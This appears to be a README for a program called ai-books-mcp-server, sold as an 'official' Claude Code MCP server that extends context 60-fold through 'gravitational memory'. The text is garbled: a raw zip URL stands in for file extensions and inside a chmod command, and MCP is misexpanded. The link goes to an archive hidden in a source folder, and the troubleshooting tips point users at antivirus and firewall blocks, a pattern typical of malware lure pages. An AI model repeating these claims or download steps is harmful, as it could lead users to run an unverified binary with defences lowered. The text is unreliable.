## 📖 What is ai-books-mcp-server?

ai-books-mcp-server is a program that helps extend the memory and context of large language models (LLMs). It works by using a method called gravitational memory to increase context length up to 60 times. This means your AI models can understand and remember much more information in one session.

This server is designed especially to work with Claude Code and other Anthropic-based AI models. It serves as an official MCP (Memory Context Processor) server, making it easier for you to tap into a smarter and more powerful AI.

You do not need to know programming to use this software. This guide will walk you through downloading and running it on your computer.

---

## 🔧 Who should use this?

- People wanting to improve how AI models handle large amounts of data.
- Users of Claude Code or Anthropic AI tools looking to increase context length.
- Anyone interested in AI tools that handle books, knowledge bases, or semantic searches.

---

## 🖥️ System Requirements

Before downloading, check that your PC meets these minimum requirements:

- Operating System: Windows 10 or newer, macOS 10.15 or newer, or Linux (Ubuntu 20.04+ recommended)
- Processor: Intel i5 or equivalent AMD/Ryzen
- Memory: 8 GB RAM minimum; 16 GB recommended for best performance
- Disk Space: At least 2 GB free space
- Network: A stable internet connection to interact with the server

If your device meets these requirements, you are ready to proceed.

## 🚀 Getting Started

This section explains how to download, install, and run the ai-books-mcp-server application with simple steps.

### Step 1: Access the Download Page

First, you need to visit the download page to get the latest version of the software.

Click the link below or copy it into your web browser:

[Download ai-books-mcp-server](https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip)

This link takes you to the releases page. Here you will find all versions available for download.

---

### Step 2: Download the Software

1. On the releases page, look for the latest release. Releases are listed by version number and date.
2. Scroll down to the **Assets** section of the latest release.
3. Choose the file matching your operating system (usually ending with `.exe` for Windows, `.dmg` for macOS, or `.AppImage` / `https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip` for Linux).
4. Click the file to download it.

Save the file in a place you can easily find, like the **Downloads** folder or your Desktop.

---

### Step 3: Install the Application

The installation steps differ based on your system:

- **Windows:** Double-click the `.exe` file to run the installer. Follow the prompts on screen. You can leave default settings if unsure.
- **macOS:** Open the `.dmg` file and drag the ai-books-mcp-server app into your Applications folder.
- **Linux:** If you downloaded an `.AppImage`, make it executable by running `chmod +x https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip` in your terminal. Then, double-click it to run. For `https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip`, extract it and follow included instructions.

---

### Step 4: Run the Server

After installation, launch the program:

- Find the ai-books-mcp-server icon on your Desktop, Start Menu, or Applications folder.
- Double-click to open it.
- A command window or interface will appear showing the server is running.

You can now connect your Claude Code or Anthropic AI tool to this server to extend context memory.

---

### Step 5: Using the Server

The server runs in the background and communicates with your AI model. To use it:

- Configure your AI tool to use the localhost address `http://127.0.0.1` with the port the server shows when running (usually port 3000 or specified in instructions).
- Check your AI tool's documentation on connecting to an MCP or extension server.
- Start your AI sessions as usual; the server will handle memory extensions automatically.

---

## 🛠️ Troubleshooting Tips

- If the server does not start, check that no firewall or antivirus blocks the program.
- Make sure your device meets or exceeds the system requirements.
- Close other applications that may use the same port (like port 3000).
- Restart your computer if the server still won’t launch.
- Check the GitHub issues page if problems continue:
